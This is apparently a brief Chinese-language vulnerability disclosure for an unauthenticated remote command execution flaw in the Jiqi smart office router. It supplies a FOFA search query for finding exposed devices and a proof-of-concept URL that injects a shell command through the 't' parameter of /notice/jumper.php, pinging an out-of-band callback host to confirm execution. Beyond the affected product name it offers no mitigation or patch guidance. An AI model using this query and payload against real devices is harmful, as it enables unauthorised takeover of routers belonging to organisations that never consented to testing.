# 极企智能办公路由某接口存在RCE漏洞

**漏洞描述**

极企智能办公路由某接口存在RCE漏洞，可未授权获取系统权限。

**fofa搜索语句**

title="极企智能办公路由"

**影响版本**

极企智能办公路由

**漏洞复现**

POC：

```
/notice/jumper.php?t=;ping%20hsd632iilzpswz17zge8pbvh48a0yp.oastify.com
```